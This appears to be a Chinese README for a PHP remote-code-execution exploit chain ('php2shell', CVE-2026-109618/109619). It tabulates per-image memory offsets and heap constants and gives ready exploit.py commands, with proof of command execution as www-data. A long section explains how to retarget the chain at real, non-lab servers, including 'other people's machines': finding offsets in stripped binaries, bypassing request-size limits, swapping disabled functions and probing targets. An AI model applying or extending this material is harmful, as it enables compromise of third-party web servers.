# 偏移标定表（按镜像 digest）

> 面向 CVE-2026-109618 / CVE-2026-109619 的 php2shell 利用链：**同一个 exploit.py，换的只是几个数字**。
> 表由 `calibration.json` 生成（`python3 calibrate/build_table.py`），不要手改本文件里的表格。

## 为什么按 digest 而不是按版本号

利用链里要填的东西分两类，来源完全不同：

| 类别 | 具体常量 | 谁来定 | 是否随版本号变 |
|---|---|---|---|
| **符号偏移** | `zif_system`、`zval_ptr_dtor` | 二进制布局（构建工具链、编译选项、代码增删） | **不跟版本号走**，跟 digest 走 |
| **堆标定** | `htdata`、`stage1_n`、`stage2_t`、`stage2_v`、`stage3_pads` | 运行时堆布局（Apache/mod_php 启动分配 + php.ini + PHP 内部结构体大小） | 跟**构建族**走，通常跨小版本不变 |

两条实测结论支撑这个划分：

1. **同版本 ≠ 同偏移**：8.4.26 官方镜像是 `0x465370 / 0x65eb60`，同一份 8.4.26 源码在 lab 里自编译出来是
   `0x43a870 / 0x613c50`。所以"PHP 8.4.26 的偏移是多少"这个问题本身没有答案，只有"哪个镜像的偏移是多少"。
2. **同构建族 = 同堆标定**：8.4.26 与 8.5.11 两个官方 bookworm 镜像跨了大版本，堆常量完全一致
   （`htdata=0x690d8`、`stage1_n=841`、`stage2_t=406`、`stage2_v=16`、pads `6×(31,31)`），
   两版都能打出 `PROOF: uid=33(www-data)`。堆标定是被 Docker 官方镜像的构建方式（Debian bookworm +
   官方 configure + mod_php + 同一份 php.ini）决定的，不是被 PHP 版本号决定的。

因此正确用法是：**digest 查符号偏移（精确、可自动采），构建族查堆标定（只能实测，一族标一次）**。

表的每条记录都能追到原始采集结果（`calibrate/raw/*.json`，`collect.py` 的原样输出：image_id、
digest、符号、运行时长、失败标记）。改表只改 `calibration.json`，然后重新生成文档。

## 标定表

| PHP | 镜像 tag | digest | `zif_system` | `zval_ptr_dtor` | delta | 堆标定 | 状态 | 实测 |
|---|---|---|---|---|---|---|---|---|
| 8.5.11 | `php:8.5.11-apache` | `47e6d8849049…564e8b` | `0x5996e0` | `0x7b47a0` | `-0x21b0c0` | bookworm | ✅ 可利用 | `uid=33(www-data) gid=33(www-data) ` |
| 8.5.10 | `php:8.5.10-apache` | `e7c4a78bc342…260c43` | `0x598d60` | `0x7b3860` | `-0x21ab00` | bookworm | ✅ 可利用 | `uid=33(www-data) gid=33(www-data) `（1/2 次运行） |
| 8.5.4 | `php:8.5.4-apache` | `11a145bc831d…6d6f12` | `0x5705e0` | `0x788ba0` | `-0x2185c0` | bookworm(部分) | ⚠️ 部分（泄漏通、stage3 待标） | ❌ 未打通 |
| 8.5.12 | `php:8.5.12-apache` | `4d1f268dd3b6…16f242` | `0x59fae0` | `0x7c11a0` | `-0x2216c0` | bookworm | 🛡 已修复 | ❌ 未打通 |
| 8.4.26 | `php:8.4.26-apache` | `60111400ff77…c9c11a` | `0x465370` | `0x65eb60` | `-0x1f97f0` | bookworm | ✅ 可利用 | `uid=33(www-data) gid=33(www-data) ` |
| 8.4.25 | `php:8.4.25-apache` | `bcdc7a2fe100…b04fc5` | `0x464c70` | `0x65dc60` | `-0x1f8ff0` | bookworm | ✅ 可利用 | `uid=33(www-data) gid=33(www-data) ` |
| 8.3.36 | `php:8.3.36-apache` | `d89e8b3d2033…ac7aef` | `0x3b2a00` | `0x4a9510` | `-0xf6b10` | bookworm | 🛡 已修复 | —（只采符号） |
| 8.2.35 | `php:8.2.35-apache` | `9c371129bfc7…1de732` | `0x3a1da0` | `0x491910` | `-0xefb70` | bookworm | 🛡 已修复 | —（只采符号） |
| 7.4.21 | `php:7.4.21-apache` | `eb212d85f4f5…1dadc9` | `0x32be30` | `0x410b90` | `-0xe4d60` | bookworm | ⚠️ 链不适用 | —（只采符号） |

### 按堆标定族汇总

- **bookworm**：htdata=`0x690d8` · stage1_n=`841` · stage2_t=`406` · stage2_v=`16` · pads=[(31,31)]*6 · SID=`attacksessionid0001`
  - 覆盖 8 个镜像（8.5.11、8.5.10、8.5.12、8.4.26、8.4.25、8.3.36、8.2.35、7.4.21）：实测打通 4 个；另有 3 个已修复版未打通（是漏洞被修，不是标定错）
- **bookworm(部分)**：htdata=`0x690d8` · stage1_n=`841` · stage2_t=`406` · stage2_v=`16` · pads=[(31,31)]*6（此处不适用） · SID=`attacksessionid0001`
  - 覆盖 1 个镜像（8.5.4）：实测打通 0 个

### 非镜像目标（拿到的二进制）

不是从镜像起来的 PHP（apt/yum 包、自编译、别人的服务器上抠出来的 .so）按**二进制 sha256** 记，
因为发行版会 strip 掉 `.symtab`，`zif_system` 得靠函数表扫描找（`calibrate/find_zif.py`）。

| 二进制 | 来源 | `zif_system` | `zval_ptr_dtor` | delta | 符号表 | 堆标定 |
|---|---|---|---|---|---|---|
| `libphp8.2.so` | Debian bookworm：libapache2-mod-php8.2 8.2.32-1~deb12u1（apt 装，非 docker 官方镜像） | `0x22d2d0` | `0x2f3a90` | `-0xc67c0` | stripped（无 .symtab） | 未标定：bookworm 与 lab 两套常量都在 stage1（heap leak）失败 |
| `php-fpm8.2` | Debian bookworm：php8.2-fpm 8.2.32-1~deb12u1 | `0x221450` | `0x2e7c10` | `-0xc67c0` | stripped（无 .symtab） | 未标定（SAPI 不同，堆布局与 mod_php 不同） |

细节：`calibration.json` 的 `binaries` 段（含 sha256、验证方式）。

## 各可利用镜像的复现命令

- **PHP 8.5.11**（digest `47e6d8849049375e…`）

  ```bash
  python3 exploit.py -u http://127.0.0.1:8088/index.php --zif-offset 0x5996e0 --dtor-offset 0x7b47a0
  ```
- **PHP 8.5.10**（digest `e7c4a78bc3423849…`）

  ```bash
  python3 exploit.py -u http://127.0.0.1:8111/index.php --zif-offset 0x598d60 --dtor-offset 0x7b3860
  ```
- **PHP 8.4.26**（digest `60111400ff77bdc4…`）

  ```bash
  python3 exploit.py -u http://127.0.0.1:8089/index.php --zif-offset 0x465370 --dtor-offset 0x65eb60
  ```
- **PHP 8.4.25**（digest `bcdc7a2fe1003e50…`）

  ```bash
  python3 calibrate/collect.py --verify php:8.4.25-apache
  ```

## 怎么用

```bash
# 查某个 digest / tag 的标定
python3 calibrate/calib_lookup.py --digest sha256:47e6d8849049375e0d19e81f1b391ed88828d4653e0d1b00822185b66b564e8b
python3 calibrate/calib_lookup.py --tag php:8.5.11-apache
python3 calibrate/calib_lookup.py --binary libphp8.2.so    # 非镜像目标按二进制查
python3 calibrate/calib_lookup.py --list                   # 全部条目

# 把两个偏移喂给 exploit.py（它只做 HTTP，不读文件、不跑 docker）
python3 php8.5.11/exploit.py -u http://TARGET/index.php \
        --zif-offset 0x5996e0 --dtor-offset 0x7b47a0
```

`exploit.py` 只认 `--zif-offset/--dtor-offset`（不给直接报错退出）；表里的堆常量用
`--htdata-offset/--stage1-n/--stage2-t/--stage2-v/--pads` 传，默认值就是官方 bookworm 那套。

## 怎么扩表

```bash
# 采符号（快，不启动容器；只 cat 出 libphp.so 解析 ELF）
python3 calibrate/collect.py --no-verify php:8.5.13-apache

# 采符号 + 真跑一遍（慢，要起单 worker 靶标，成功才写 verified=true）
python3 calibrate/collect.py --verify php:8.5.13-apache
```

采集器在 lab 主机上跑（需要 docker + 本仓库的 `docker/php.ini`、`docker/apache.conf`）。
新镜像如果 `--verify` 失败但日志里 stage1/stage2 都过了、stage3 打不通（容器日志出现
`zend_mm_heap corrupted`），说明**符号偏移对、堆标定族不对**——这时该做的是给这个构建族
重新标 `stage3_pads`，而不是换偏移。

## 踩坑清单（都是实测）

- **必须单 worker**：`apache.conf` 里 prefork 限 1 个 worker，否则 stage2 的泄漏请求可能落到
  另一个 worker，堆基址对不上，后面全崩。
- **`display_errors` 必须开**、`max_input_vars` 必须默认 1000：前者让 `headers_sent` 提前置位，
  后者让警告在最合适的时刻触发。这两条是泄漏的前提，不是"调试方便"。
- **默认 128M / `post_max_size=8M` 的目标**：加 `--chunked --huge-mb 140`，大于 8MB 的请求自动走
  chunked，绕过 `post_max_size`。本仓库镜像的 `php.ini` 把 memory_limit 调成 8M 只是为了跑得快。
- **`--proof-file` 要和容器的挂载路径对上**：容器里 `/out` 挂到仓库的 `out/`，命令是
  `id>/out/p1`；路径不一致会误报 `no proof`——但命令**可能已经 blind 执行了**，
  判断成败别只看这一条。
- **重试是常态**：堆布局每次略有差异，stage1/stage2 各重试 2–3 次一般就成。
- **tag 会漂**：`php:8.2-apache` 曾经指向另一个 digest（`9e5766bc…`），现在指向 8.2.35 的
  `9c371129…`。要用固定 digest 拉镜像（`docker pull php@sha256:…`），否则标定对不上。

## 已修复版本怎么记

8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 是官方修复版，链的三个前提（stage1 越界读、stage2 stale 全局、
stage3 OOM 状态损坏）至少有一个不再成立，所以表里标 `patched`：**符号偏移照记**（它们是同一套
构建族，做对照实验、验证"是漏洞被修了而不是偏移写错了"时要用），但不要指望能打通。

## 不是 docker 官方镜像：哪些部分一定要改

把目标从"官方 `php:*-apache` 镜像"换成"真实的服务器（apt/yum 包、自编译、宝塔、别人的机器）"，
按影响链的哪一步排序，**必改项**如下：

| # | 改什么 | 官方镜像为什么能直接用 | 非镜像目标为什么要改 | 怎么改 |
|---|---|---|---|---|
| 1 | `zif_system` 偏移 | 官方镜像没 strip，`.symtab` 里有 | 发行版 RPM/DEB **只剩 `.dynsym`**，`zif_system` 是内部函数，不在导出表里 | `calibrate/find_zif.py` 扫 `zend_function_entry`（`fname="system"` → handler）；有 `-dbgsym`/`-debuginfo` 时直接读 `.symtab` |
| 2 | `zval_ptr_dtor` 偏移 | 同上 | 大多数构建里它**是**导出符号（`readelf --dyn-syms` 能读到），但不是必然 | `readelf -sW --dyn-syms` 优先；没有就走 find_zif 同款扫描（`pDestructor` 赋值点的特征码） |
| 3 | `delta = zif - dtor` | 直接算 | 同上 | 实测同一构建的 `libphp8.2.so` 与 `php-fpm8.2` **delta 完全相同**（都是 `0xc67c0`）→ delta 是构建级常量，一次标定覆盖多个二进制 |
| 4 | 5 个堆常量（`htdata`/`stage1_n`/`stage2_t`/`stage2_v`/`pads`） | 一族一套 | **一定要重标**。实测 Debian 8.2.32：bookworm 与 lab 两套常量都死在 stage1（连堆基址都泄不出来） | 起单 worker 靶标，跑 `collect.py --verify`；失败就按 stage1→stage2→stage3 逐步二分。日志里 `zend_mm_heap corrupted` = 偏移对、pads 错 |
| 5 | `stage3_carrier` 策略 | bookworm 用"`Cookie: PHPSESSID=aaa…` 保住 PS(id)"，lab 用"2×ref" | 会话实现/结构体偏移变了就要换载体 | 先跑 stage1/2 确认泄漏通，再拿 stage3 的 carrier 做 A/B |
| 6 | SAPI 与 worker 模型 | mod_php + prefork，杀 worker 就 fork 个干净的 | FPM 要 `pm=static` + `pm.max_children=1` + `pm.max_requests=0`；**CGI / 每请求 fork** 上链不成立（stale 全局不跨进程） | 先用 `php_sapi_name()` 或响应头判断；FPM 必须保证同一个 worker 连续处理这三个 stage |
| 7 | 请求体尺寸链路 | 镜像里 `memory_limit` 由我们的 `php.ini` 定 | 真实目标 `memory_limit` 常是 128M/256M，`post_max_size=8M`，前面还有 nginx `client_max_body_size 1m` | `--huge-mb` 提到 `memory_limit` 以上，`--chunked` 绕 `post_max_size`；代理层限制要么改配置要么换 OOM 触发方式 |
| 8 | php.ini 前提 | 我们自己的 `docker/php.ini` | 目标常是 `display_errors=Off`、`max_input_vars=-1`、`session.upload_progress.enabled=Off` | 见下节"探测清单"；`upload_progress` 关掉就得换 carrier，`max_input_vars` 不是 1000 就得改 `rotate()` 的 1001 字段数 |
| 9 | 结构体偏移（跨大版本） | 8.x 内部布局稳定 | 7.x/未来 9.x 的 `zend_array`/`zend_execute_data` 字段位置会变；`disable_functions` 里有 `system` 时 `zif_system` 会直接 return false，要换 `zif_proc_open`/`zif_passthru` 等 | 按 `zend_types.h` 重算 fake 结构体；`disable_functions` 先读 `php -i` 或 phpinfo 确认 |
| 10 | 泄漏载体的传输路径 | 直连 Apache | nginx+FPM 的 `fastcgi_buffer_size` 默认 4k/8k，4096B 的 Set-Cookie 会让 nginx 报 `upstream sent too big header`（502），泄漏直接丢 | 需要把泄漏塞进 body，或确认 `fastcgi_buffer_size` 足够大 |

### 探测清单（拿不到源码/配置时的判断顺序）

1. `php_sapi_name()`（或 `Server`/`X-Powered-By`）→ `apache2handler` / `fpm-fcgi` / `cgi-fcgi` / `cli-server`。
2. 故意发一个超大 multipart（>8MB）→ 413/502 = 代理或 `post_max_size` 拦；200 = 能过。
3. 发 `PHPSESSID` + `PHP_SESSION_UPLOAD_PROGRESS` 的 multipart → 返回头有没有 `Set-Cookie: PHPSESSID=...; path=/`（`parse_cookie` 吃的就是这个形状）；没有就是 session 机制/ini 不同。
4. `session.upload_progress.enabled` → 用一个 1KB 的 upload 请求看 `$_SESSION` 里有没有 `upload_progress_*`（需要目标页面配合）或看响应头。
5. 拿到二进制（容器镜像 / 包 / 目标机器上 `dpkg -S`）→ `sha256sum` 记身份，`find_zif.py` + `readelf --dyn-syms` 取偏移，然后 `collect.py --verify` 标堆。
